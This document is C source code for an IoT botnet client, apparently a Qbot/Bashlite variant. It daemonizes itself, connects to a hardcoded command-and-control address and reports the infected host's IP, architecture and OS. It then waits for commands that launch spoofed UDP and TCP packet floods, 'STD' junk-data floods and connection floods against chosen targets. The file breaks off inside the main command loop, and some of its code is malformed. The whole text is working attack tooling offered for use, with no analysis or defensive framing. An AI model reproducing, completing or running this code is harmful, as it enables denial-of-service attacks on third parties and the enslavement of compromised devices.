// Created by: Non Responding
// Edited by: Logiztiic
// Published by: Self Rep NeTiS

#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define CMD_IAC   255
#define CMD_WILL  251
#define CMD_WONT  252
#define CMD_DO    253
#define CMD_DONT  254
#define OPT_SGA   3
#define std_packets 1460
#define BUFFER_SIZE 512
unsigned char *commServer[] = {"176.123.6.22:990"};
int initConnection();
void makeRandomStr(unsigned char *buf, int length);
int sockprintf(int sock, char *formatStr, ...);
char *inet_ntoa(struct in_addr in);
int mainCommSock = 0, currentServer = -1, gotIP = 0;
uint32_t *pids;
uint64_t numpids = 0;
struct in_addr ourIP;
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
unsigned char macAddress[6] = {0};

void init_rand(uint32_t x)
{
	int i;

	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;

	for (i = 3; i < 4096; i++) Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
}
uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (uint32_t)(t >> 32);
	x = t + c;
	if (x < c) {
		x++;
		c++;
	}
	return (Q[i] = r - x);
}
in_addr_t getRandomIP(in_addr_t netmask) {
        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
        return tmp ^ ( rand_cmwc() & ~netmask);
}
unsigned char *fdgets(unsigned char *buffer, int bufferSize, int fd)
{
    int got = 1, total = 0;
    while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
    return got == 0 ? NULL : buffer;
}
int getOurIP()
{
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if(sock == -1) return 0;

    struct sockaddr_in serv;
    memset(&serv, 0, sizeof(serv));
    serv.sin_family = AF_INET;
    serv.sin_addr.s_addr = inet_addr("8.8.8.8");
    serv.sin_port = htons(53);

    int err = connect(sock, (const struct sockaddr*) &serv, sizeof(serv));
    if(err == -1) return 0;

    struct sockaddr_in name;
    socklen_t namelen = sizeof(name);
    err = getsockname(sock, (struct sockaddr*) &name, &namelen);
    if(err == -1) return 0;

    ourIP.s_addr = name.sin_addr.s_addr;
    int cmdline = open("/proc/net/route", O_RDONLY);
    char linebuf[4096];
    while(fdgets(linebuf, 4096, cmdline) != NULL)
    {
        if(strstr(linebuf, "\t00000000\t") != NULL)
        {
            unsigned char *pos = linebuf;
            while(*pos != '\t') pos++;
            *pos = 0;
            break;
        }
        memset(linebuf, 0, 4096);
    }
    close(cmdline);

    if(*linebuf)
    {
        int i;
        struct ifreq ifr;
        strcpy(ifr.ifr_name, linebuf);
        ioctl(sock, SIOCGIFHWADDR, &ifr);
        for (i=0; i<6; i++) macAddress[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
    }

    close(sock);
}
void trim(char *str)
{
	int i;
	int begin = 0;
	int end = strlen(str) - 1;

	while (isspace(str[begin])) begin++;

	while ((end >= begin) && isspace(str[end])) end--;
	for (i = begin; i <= end; i++) str[i - begin] = str[i];

	str[i - begin] = '\0';
}

static void printchar(unsigned char **str, int c)
{
	if (str) {
		**str = c;
		++(*str);
	}
	else (void)write(1, &c, 1);
}

static int prints(unsigned char **out, const unsigned char *string, int width, int pad)
{
	register int pc = 0, padchar = ' ';

	if (width > 0) {
		register int len = 0;
		register const unsigned char *ptr;
		for (ptr = string; *ptr; ++ptr) ++len;
		if (len >= width) width = 0;
		else width -= len;
		if (pad & PAD_ZERO) padchar = '0';
	}
	if (!(pad & PAD_RIGHT)) {
		for ( ; width > 0; --width) {
			printchar (out, padchar);
			++pc;
		}
	}
	for ( ; *string ; ++string) {
		printchar (out, *string);
		++pc;
	}
	for ( ; width > 0; --width) {
		printchar (out, padchar);
		++pc;
	}

	return pc;
}

static int printi(unsigned char **out, int i, int b, int sg, int width, int pad, int letbase)
{
	unsigned char print_buf[PRINT_BUF_LEN];
	register unsigned char *s;
	register int t, neg = 0, pc = 0;
	register unsigned int u = i;

	if (i == 0) {
		print_buf[0] = '0';
		print_buf[1] = '\0';
		return prints (out, print_buf, width, pad);
	}

	if (sg && b == 10 && i < 0) {
		neg = 1;
		u = -i;
	}

	s = print_buf + PRINT_BUF_LEN-1;
	*s = '\0';

	while (u) {
		t = u % b;
		if( t >= 10 )
		t += letbase - '0' - 10;
		*--s = t + '0';
		u /= b;
	}

	if (neg) {
		if( width && (pad & PAD_ZERO) ) {
			printchar (out, '-');
			++pc;
			--width;
		}
		else {
			*--s = '-';
		}
	}

	return pc + prints (out, s, width, pad);
}

static int print(unsigned char **out, const unsigned char *format, va_list args )
{
	register int width, pad;
	register int pc = 0;
	unsigned char scr[2];

	for (; *format != 0; ++format) {
		if (*format == '%') {
			++format;
			width = pad = 0;
			if (*format == '\0') break;
			if (*format == '%') goto out;
			if (*format == '-') {
				++format;
				pad = PAD_RIGHT;
			}
			while (*format == '0') {
				++format;
				pad |= PAD_ZERO;
			}
			for ( ; *format >= '0' && *format <= '9'; ++format) {
				width *= 10;
				width += *format - '0';
			}
			if( *format == 's' ) {
				register char *s = (char *)va_arg( args, int );
				pc += prints (out, s?s:"(null)", width, pad); // this to
				continue;
			}
			if( *format == 'd' ) {
				pc += printi (out, va_arg( args, int ), 10, 1, width, pad, 'a');
				continue;
			}
			if( *format == 'x' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'X' ) {
				pc += printi (out, va_arg( args, int ), 16, 0, width, pad, 'A');
				continue;
			}
			if( *format == 'u' ) {
				pc += printi (out, va_arg( args, int ), 10, 0, width, pad, 'a');
				continue;
			}
			if( *format == 'c' ) {
				scr[0] = (unsigned char)va_arg( args, int );
				scr[1] = '\0';
				pc += prints (out, scr, width, pad);
				continue;
			}
		}
		else {
out:
			printchar (out, *format);
			++pc;
		}
	}
	if (out) **out = '\0';
	va_end( args );
	return pc;
}
int sockprintf(int sock, char *formatStr, ...)
{
	unsigned char *textBuffer = malloc(2048);
	memset(textBuffer, 0, 2048);
	char *orig = textBuffer;
	va_list args;
	va_start(args, formatStr);
	print(&textBuffer, formatStr, args);
	va_end(args);
	orig[strlen(orig)] = '\n';
	int q = send(sock,orig,strlen(orig), MSG_NOSIGNAL);
	free(orig);
	return q;
}

int getHost(unsigned char *toGet, struct in_addr *i)
{
	struct hostent *h;
	if((i->s_addr = inet_addr(toGet)) == -1) return 1;
	return 0;
}

void makeRandomStr(unsigned char *buf, int length)
{
	int i = 0;
	for(i = 0; i < length; i++) buf[i] = (rand_cmwc()%(91-65))+65;
}

int recvLine(int socket, unsigned char *buf, int bufsize)
{
	memset(buf, 0, bufsize);
	fd_set myset;
	struct timeval tv;
	tv.tv_sec = 30;
	tv.tv_usec = 0;
	FD_ZERO(&myset);
	FD_SET(socket, &myset);
	int selectRtn, retryCount;
	if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
		while(retryCount < 10)
		{
			tv.tv_sec = 30;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(socket, &myset);
			if ((selectRtn = select(socket+1, &myset, NULL, &myset, &tv)) <= 0) {
				retryCount++;
				continue;
			}
			break;
		}
	}
	unsigned char tmpchr;
	unsigned char *cp;
	int count = 0;
	cp = buf;
	while(bufsize-- > 1)
	{
		if(recv(mainCommSock, &tmpchr, 1, 0) != 1) {
			*cp = 0x00;
			return -1;
		}
		*cp++ = tmpchr;
		if(tmpchr == '\n') break;
		count++;
	}
	*cp = 0x00;
	return count;
}

int connectTimeout(int fd, char *host, int port, int timeout)
{
	struct sockaddr_in dest_addr;
	fd_set myset;
	struct timeval tv;
	socklen_t lon;

	int valopt;
	long arg = fcntl(fd, F_GETFL, NULL);
	arg |= O_NONBLOCK;
	fcntl(fd, F_SETFL, arg);

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(port);
	if(getHost(host, &dest_addr.sin_addr)) return 0;
	memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
	int res = connect(fd, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

	if (res < 0) {
		if (errno == EINPROGRESS) {
			tv.tv_sec = timeout;
			tv.tv_usec = 0;
			FD_ZERO(&myset);
			FD_SET(fd, &myset);
			if (select(fd+1, NULL, &myset, NULL, &tv) > 0) {
				lon = sizeof(int);
				getsockopt(fd, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
				if (valopt) return 0;
			}
			else return 0;
		}
		else return 0;
	}

	arg = fcntl(fd, F_GETFL, NULL);
	arg &= (~O_NONBLOCK);
	fcntl(fd, F_SETFL, arg);

	return 1;
}

int listFork()
{
	uint32_t parent, *newpids, i;
	parent = fork();
	if (parent <= 0) return parent;
	numpids++;
	newpids = (uint32_t*)malloc((numpids + 1) * 4);
	for (i = 0; i < numpids - 1; i++) newpids[i] = pids[i];
	newpids[numpids - 1] = parent;
	free(pids);
	pids = newpids;
	return parent;
}

unsigned short csum (unsigned short *buf, int count)
{
	register uint64_t sum = 0;
	while( count > 1 ) { sum += *buf++; count -= 2; }
	if(count > 0) { sum += *(unsigned char *)buf; }
	while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
	return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
{

	struct tcp_pseudo
	{
		unsigned long src_addr;
		unsigned long dst_addr;
		unsigned char zero;
		unsigned char proto;
		unsigned short length;
	} pseudohead;
	unsigned short total_len = iph->tot_len;
	pseudohead.src_addr=iph->saddr;
	pseudohead.dst_addr=iph->daddr;
	pseudohead.zero=0;
	pseudohead.proto=IPPROTO_TCP;
	pseudohead.length=htons(sizeof(struct tcphdr));
	int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
	unsigned short *tcp = malloc(totaltcp_len);
	memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
	memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
	unsigned short output = csum(tcp,totaltcp_len);
	free(tcp);
	return output;
}

void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + packetSize;
	iph->id = rand_cmwc();
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = protocol;
	iph->check = 0;
	iph->saddr = source;
	iph->daddr = dest;
}

void audp(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval)
{
    struct sockaddr_in dest_addr; dest_addr.sin_family = AF_INET;
    if(port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if(getHost(target, &dest_addr.sin_addr)) return; memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
    register unsigned int pollRegister; pollRegister = pollinterval;
    if(spoofit == 32) {int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);  
    if(!sockfd) { 
    return; 
    } 
    unsigned char *buf = (unsigned char *)malloc(packetsize + 1); 
    if(buf == NULL) return; memset(buf, 0, packetsize + 1); 
    makeRandomStr(buf, packetsize); 
    int end = time(NULL) + timeEnd;  
    register unsigned int i = 0; 
    while(1) { 
    sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); 
    if(i == pollRegister) { 

        if(port == 0) dest_addr.sin_port = rand_cmwc(); 
    if(time(NULL) > end) 
        break; i = 0; continue; } i++; }} else {int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP); if(!sockfd) {  return;} int tmp = 1; if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0){return;} int counter = 50; while(counter--) { srand(time(NULL) ^ rand_cmwc());init_rand(rand());} in_addr_t netmask; if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) ); else netmask = ( ~((1 << (32 - spoofit)) - 1) );unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize]; struct iphdr *iph = (struct iphdr *)packet; struct udphdr *udph = (void *)iph + sizeof(struct iphdr);  makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_UDP, sizeof(struct udphdr) + packetsize); udph->len = htons(sizeof(struct udphdr) + packetsize);  udph->source = rand_cmwc(); udph->dest = (port == 0 ? rand_cmwc() : htons(port)); udph->check = 0; makeRandomStr((unsigned char*)(((unsigned char *)udph) + sizeof(struct udphdr)), packetsize); iph->check = csum ((unsigned short *) packet, iph->tot_len); int end = time(NULL) + timeEnd; register unsigned int i = 0; while(1){ sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));  udph->source = rand_cmwc();  udph->dest = (port == 0 ? rand_cmwc() : htons(port)); iph->id = rand_cmwc(); iph->saddr = htonl( getRandomIP(netmask) ); iph->check = csum ((unsigned short *) packet, iph->tot_len); if(i == pollRegister){if(time(NULL) > end) break; i = 0; continue; } i++; } }
}

void atcp(unsigned char *target, int port, int timeEnd, int spoofit, unsigned char *flags, int packetsize, int pollinterval)
{
    register unsigned int pollRegister; pollRegister = pollinterval;
    struct sockaddr_in dest_addr; 
    dest_addr.sin_family = AF_INET; 
    if(port == 0) 
    dest_addr.sin_port = rand_cmwc(); 
    else 
    dest_addr.sin_port = htons(port); 
    if(getHost(target, &dest_addr.sin_addr)) 
    return; 
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero); 
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if(!sockfd) {    
    return;  
     }  
    int tmp = 1;
    if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0) { 
    return;
    } 
    in_addr_t netmask;
    if ( spoofit == 0 ) 
    netmask = ( ~((in_addr_t) -1) ); 
    else 
    netmask = ( ~((1 << (32 - spoofit)) - 1) ); 
    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize]; 
    struct iphdr *iph = (struct iphdr *)packet; 
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr); 
    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl( getRandomIP(netmask) ), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize); 
    tcph->source = rand_cmwc(); 
    tcph->seq = rand_cmwc(); 
    tcph->ack_seq = 0; 
    tcph->doff = 5;
    if(!strcmp(flags, "all")){ tcph->syn = 1; tcph->rst = 1;  tcph->fin = 1; tcph->ack = 1; tcph->psh = 1;} else { unsigned char *pch = strtok(flags, ","); while(pch){ if(!strcmp(pch, "syn")){ tcph->syn = 1; } else if(!strcmp(pch,  "rst")){ tcph->rst = 1; } else if(!strcmp(pch,  "fin")) { tcph->fin = 1;} else if(!strcmp(pch,  "ack")){ tcph->ack = 1;} else if(!strcmp(pch,  "psh")){tcph->psh = 1;} else {} pch = strtok(NULL, ",");}}  tcph->window = rand_cmwc(); tcph->check = 0; tcph->urg_ptr = 0; tcph->dest = (port == 0 ? rand_cmwc() : htons(port)); tcph->check = tcpcsum(iph, tcph); iph->check = csum ((unsigned short *) packet, iph->tot_len); int end = time(NULL) + timeEnd; register unsigned int i = 0;
    while(1){ sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)); iph->saddr = htonl( getRandomIP(netmask) ); iph->id = rand_cmwc(); tcph->seq = rand_cmwc(); tcph->source = rand_cmwc(); tcph->check = 0; tcph->check = tcpcsum(iph, tcph); iph->check = csum ((unsigned short *) packet, iph->tot_len); if(i == pollRegister) { if(time(NULL) > end) break;  i = 0; continue; } i++; }
}
void astd(unsigned char *ip, int port, int secs) 
{
	int std_hex;
	std_hex = socket(AF_INET, SOCK_DGRAM, 0);
	time_t start = time(NULL);
	struct sockaddr_in sin;
	struct hostent *hp;
	hp = gethostbyname(ip);
	bzero((char*) &sin,sizeof(sin));
	bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
	sin.sin_family = hp->h_addrtype;
	sin.sin_port = port;
	unsigned int a = 0;
	while(1)
	{
		char *hexstring[] = {"4E/x31/x6B/x4B/x31/x20/x21/x73/x69/x20/x4D/x33/x75/x79/x20/x4C/x30/x56/x72/x33/x20/x3C/x33/x20/x50/x61/x32/x72/x43/x48/x20/x4D/x32/x20/x41/x34/x34/x72/x43/x4B",
							 "\x6c\x58\x66\x59\x69\x18\x66\x59\x43\x37\x54\x46\x61\x43\x71\x35\x48\x76\x39\x38\x32\x77\x75\x49\x69\x4b\x62\x48\x6c\x67\x46\x41\x30\x6a\x45\x73\x57\x32\x4f\x46\x51\x53\x74\x4f\x37\x78\x36\x7a\x4e\x39\x64\x42\x67\x61\x79\x79\x57\x67\x76\x62\x6b\x30\x4c\x33\x6c\x5a\x43\x6c\x7a\x4a\x43\x6d\x46\x47\x33\x47\x56\x4e\x44\x46\x63\x32\x69\x54\x48\x4e\x59\x79\x37\x67\x73\x73\x38\x64\x48\x62\x6f\x42\x64\x65\x4b\x45\x31\x56\x63\x62\x6c\x48\x31\x41\x78\x72\x56\x79\x69\x71\x6f\x6b\x77\x32\x52\x59\x46\x76\x64\x34\x63\x64\x31\x51\x78\x79\x61\x48\x61\x77\x77\x50\x36\x67\x6f\x39\x66\x65\x42\x65\x48\x64\x6c\x76\x4d\x52\x44\x4c\x62\x45\x62\x74\x79\x33\x50\x79\x38\x79\x56\x54\x33\x55\x54\x6a\x79\x33\x5a\x4b\x4f\x4e\x58\x6d\x4d\x4e\x76\x55\x52\x54\x55\x5a\x54\x6b\x65\x48\x33\x37\x58\x54\x39\x48\x35\x4a\x77\x48\x30\x76\x4b\x42\x31\x59\x77\x32\x72\x53\x59\x6b\x54\x77\x63\x54\x76\x78\x36\x4f\x6c\x74\x53\x49\x6c\x61\x68\x46\x67\x39\x32\x75\x43\x52\x62\x4c\x4d\x38\x61\x6d\x68\x38\x47\x61\x47\x47\x47\x52\x77\x35\x36\x69\x4e\x55\x54\x47\x4c\x67\x69\x33\x39\x35\x76\x6a\x39\x5a\x56\x56\x65\x50\x30\x31\x6b\x37\x54\x76\x71\x33\x4e\x52\x76\x78\x6f\x23\x23\x23\x23\x23\x23\x23\x23\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x21\x40\x21\x40\x21\x40\x24\x21\x25\x40\x26\x24\x5e\x21\x40\x25\x25\x5e\x21\x40\x25\x2a\x21\x28\x40\x25\x26\x2a\x28\x21\x40\x25\x26\x21\x40\x2a\x28\x25\x26\x21\x40\x28\x29\x25\x2a\x21\x40\x25\x29\x29",
							 "/x6f/x58/x22/x2e/x04/x92/x04/xa4/x42/x94/xb4/xf4/x44/xf4/x94/xd2/x04/xb4/xc4/xd2/x05/x84/xb4/xa4/xa6/xb3/x24/xd4/xb4/xf4/xa5/x74/xf4/x42/x04/x94/xf2/x24/xf5/x02/x03/xc4/x45/x04/xf5/x14/x44/x23",
						     "\x78\x6d\x69\x77\x64\x69\x6f\x20\x4d\x4f\x51\x57\x49\x22\x4b\x20\x28\x2a\x2a\x28\x44\x38\x75\x39\x32\x38\x39\x64\x32\x38\x39\x32\x65\x39\x20\x4e\x49\x4f\x57\x4a\x44\x69\x6f\x6a\x77\x69\x6f\x57\x41\x4a\x4d\x20\x44\x4b\x4c\x41\x4d\x29\x20",
						  	 "/x48/x39/x32/x29/x53/x54/x49/x6c/x65/x20/x29/x5f/x51/x20/x49/x53/x4e/x22/x20/x4b/x58/x4d/x3c/x20/x4f/x53/x51/x22/x4f/x50/x20/x50/x41/x43/x4b/x45/x54/x20/xc2/xa3/x52/x4f/x4d/x57/x44/x4b/x4c/x57",
							};

		{
			send(std_hex, hexstring, std_packets, 0);
			connect(std_hex,(struct sockaddr *) &sin, sizeof(sin));
			if (time(NULL) >= start + secs)
			{
				close(std_hex);
				_exit(0);
			}
			a = 0;
		}
		a++;
	}
}
void acnc(unsigned char *ip,int port, int end_time)
{
	int end = time(NULL) + end_time;
	int sockfd;
	struct sockaddr_in server;
	//sockfd = socket(AF_INET, SOCK_STREAM, 0);
	
	server.sin_addr.s_addr = inet_addr(ip);
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
	
	while(end > time(NULL))
	{
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
		connect(sockfd , (struct sockaddr *)&server , sizeof(server));
		sleep(1);
		close(sockfd);
	}
	
}
char *getArch() {
    #if defined(__x86_64__) || defined(_M_X64)
    return "x86_64";
    #elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86)
    return "x86_32";
    #elif defined(__ARM_ARCH_2__) || defined(__ARM_ARCH_3__) || defined(__ARM_ARCH_3M__) || defined(__ARM_ARCH_4T__) || defined(__TARGET_ARM_4T)
    return "Arm4";
    #elif defined(__ARM_ARCH_5_) || defined(__ARM_ARCH_5E_)
    return "Arm5"
    #elif defined(__ARM_ARCH_6T2_) || defined(__ARM_ARCH_6T2_) ||defined(__ARM_ARCH_6__) || defined(__ARM_ARCH_6J__) || defined(__ARM_ARCH_6K__) || defined(__ARM_ARCH_6Z__) || defined(__ARM_ARCH_6ZK__) || defined(__aarch64__)
    return "Arm6";
    #elif defined(__ARM_ARCH_7__) || defined(__ARM_ARCH_7A__) || defined(__ARM_ARCH_7R__) || defined(__ARM_ARCH_7M__) || defined(__ARM_ARCH_7S__)
    return "Arm7";
    #elif defined(mips) || defined(__mips__) || defined(__mips)
    return "Mips";
	#elif defined(mipsel) || defined (__mipsel__) || defined (__mipsel) || defined (_mipsel)
	return "Mipsel";
    #elif defined(__sh__)
    return "Sh4";
    #elif defined(__powerpc) || defined(__powerpc__) || defined(__powerpc64__) || defined(__POWERPC__) || defined(__ppc__) || defined(__ppc64__) || defined(__PPC__) || defined(__PPC64__) || defined(_ARCH_PPC) || defined(_ARCH_PPC64)
    return "Ppc";
    #elif defined(__sparc__) || defined(__sparc)
    return "spc";
    #elif defined(__m68k__)
    return "M68k";
	#elif defined(__arc__)
	return "Arc";
    #else
    return "Unknown";
    #endif
}
char *getBuildz()
{
	if(access("/usr/bin/python", F_OK) != -1){
	return "Python Device";
	}
	if(access("/usr/bin/perl", F_OK) != -1){
	return "Perl Device";
	}
	if(access("/usr/sbin/telnetd", F_OK) != -1){
	return "Telnet Device";
	} else {
	return "Unknown";
	}
}
char *getPortz()
{
	if(access("/usr/bin/python", F_OK) != -1){
	return "22";
	}
	if(access("/usr/bin/perl", F_OK) != -1){
	return "22";
	}
	if(access("/usr/sbin/telnetd", F_OK) != -1){
	return "23";
	} else {
	return "22";
	}
}
char *getOS()
{
	if(access("/etc/apt/apt.conf", F_OK) != -1){
	return "Debian Based Device";
	}
	if(access("/etc/yum.conf", F_OK) != -1){
	return "REHL Based Device";
	} else {
	return "Unknown OS";
	}
}
void processCmd(int argc, unsigned char *argv[])
{
	if(!strcmp(argv[0], "UDP"))
	{
		if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[5]) == -1 || atoi(argv[5]) > 65500 || atoi(argv[4]) > 32 || (argc == 7 && atoi(argv[6]) < 1))
		{
			return;
		}

		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int spoofed = atoi(argv[4]);
		int packetsize = atoi(argv[5]);
		int pollinterval = (argc == 7 ? atoi(argv[6]) : 10);

		if(strstr(ip, ",") != NULL)
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL)
			{
				if(!listFork())
				{
					audp(hi, port, time, spoofed, packetsize, pollinterval);
					close(mainCommSock);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			audp(ip, port, time, spoofed, packetsize, pollinterval);
			close(mainCommSock);

			_exit(0);
		}
	}
	if(!strcmp(argv[0], "STD"))
	{
		if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
		{
			return;
		}
		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		if(strstr(ip, ",") != NULL)
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL)
			{
				if(!listFork())
				{
					astd(hi, port, time);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			astd(ip, port, time);
			_exit(0);
		}
	}	
	if(!strcmp(argv[0], "TCP"))
	{
		if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
		{
			return;
		}

		unsigned char *ip = argv[1];
		int port = atoi(argv[2]);
		int time = atoi(argv[3]);
		int spoofed = atoi(argv[4]);
		unsigned char *flags = argv[5];

		int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
		int psize = argc > 6 ? atoi(argv[6]) : 0;

		if(strstr(ip, ",") != NULL)
		{
			unsigned char *hi = strtok(ip, ",");
			while(hi != NULL)
			{
				if(!listFork())
				{
					atcp(hi, port, time, spoofed, flags, psize, pollinterval);
					close(mainCommSock);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			sockprintf(mainCommSock, "Sending TCP Packets To: %s:%d for %d seconds", argv[1], atoi(argv[2]), atoi(argv[3]));
			atcp(ip, port, time, spoofed, flags, psize, pollinterval);
			close(mainCommSock);

			_exit(0);
		}
	}
	if(!strcmp(argv[0], "STOMP"))
	{
        if(argc < 6 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1 || atoi(argv[4]) == -1 || atoi(argv[4]) > 32 || (argc > 6 && atoi(argv[6]) < 0) || (argc == 8 && atoi(argv[7]) < 1))
        {
            return;
        }
        unsigned char *ip = argv[1];
        int port = atoi(argv[2]);
        int time = atoi(argv[3]);
        int spoofed = atoi(argv[4]);
        unsigned char *flags = argv[5];
		int pollinterval = argc == 8 ? atoi(argv[7]) : 10;
        int packetsize = argc > 6 ? atoi(argv[6]) : 0;
        if(strstr(ip, ",") != NULL)
        {
            unsigned char *hi = strtok(ip, ",");
            while(hi != NULL)
            {
				if(!listFork())
				{
					astd(ip, port, time);
                    audp(ip, port, time, spoofed, packetsize, pollinterval);
                    atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
					close(mainCommSock);
					_exit(0);
				}
				hi = strtok(NULL, ",");
			}
		} else {
			if (listFork()) { return; }
			astd(ip, port, time);
			audp(ip, port, time, spoofed, packetsize, pollinterval);
			atcp(ip, port, time, spoofed, flags, packetsize, pollinterval);
			close(mainCommSock);
			_exit(0);
		}
	}		
	if(!strcmp(argv[0], "CNC"))
        {
                if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
                {
                        
                        return;
                }

                unsigned char *ip = argv[1];
                int port = atoi(argv[2]);
                int time = atoi(argv[3]);

                if(strstr(ip, ",") != NULL)
                {
                        unsigned char *hi = strtok(ip, ",");
                        while(hi != NULL)
                        {
                                if(!listFork())
                                {
                                        acnc(hi, port, time);
                                        close(mainCommSock);
                                        _exit(0);
                                }
                                hi = strtok(NULL, ",");
                        }
                } else {
                        if (listFork()) { return; }

                        acnc(ip, port, time);
                        _exit(0);
                }
        }
	if(!strcmp(argv[0], "STOP"))
	{
		int killed = 0;
		unsigned long i;
		for (i = 0; i < numpids; i++) {
			if (pids[i] != 0 && pids[i] != getpid()) {
				kill(pids[i], 9);
				killed++;
			}
		}

		if(killed > 0)
		{
		} else {
		}
	}
}
int initConnection()
{
	unsigned char server[512];
	memset(server, 0, 512);
	if(mainCommSock) { close(mainCommSock); mainCommSock = 0; }
	if(currentServer + 1 == SERVER_LIST_SIZE) currentServer = 0;
	else currentServer++;

	strcpy(server, commServer[currentServer]);
	int port = 6982;
	if(strchr(server, ':') != NULL)
	{
		port = atoi(strchr(server, ':') + 1);
		*((unsigned char *)(strchr(server, ':'))) = 0x0;
	}

	mainCommSock = socket(AF_INET, SOCK_STREAM, 0);

	if(!connectTimeout(mainCommSock, server, port, 30)) return 1;

	return 0;
}

int main(int argc, char *argv[])
{
	if(SERVER_LIST_SIZE <= 0) return 0;

	srand(time(NULL) ^ getpid());
	init_rand(time(NULL) ^ getpid());
	getOurIP();
	pid_t pid1;
	pid_t pid2;
	int status;

	if (pid1 = fork()) {
			waitpid(pid1, &status, 0);
			exit(0);
	} else if (!pid1) {
			if (pid2 = fork()) {
					exit(0);
			} else if (!pid2) {
			} else {
			}
	} else {
	}
	setsid();
	chdir("/");
	signal(SIGPIPE, SIG_IGN);

	while(1)
	{
		if(initConnection()) { sleep(5); continue; }
		sockprintf(mainCommSock, "[Shelling]-->[%s]-->[%s]-->[%s]-->[%s]-->[%s]", inet_ntoa(ourIP), getPortz(), getBuildz(), getArch(), getOS());
		char commBuf[4096];
		int got = 0;
		int i = 0;
		while((got = recvLine(mainCommSock, commBuf, 4096)) != -1)
		{
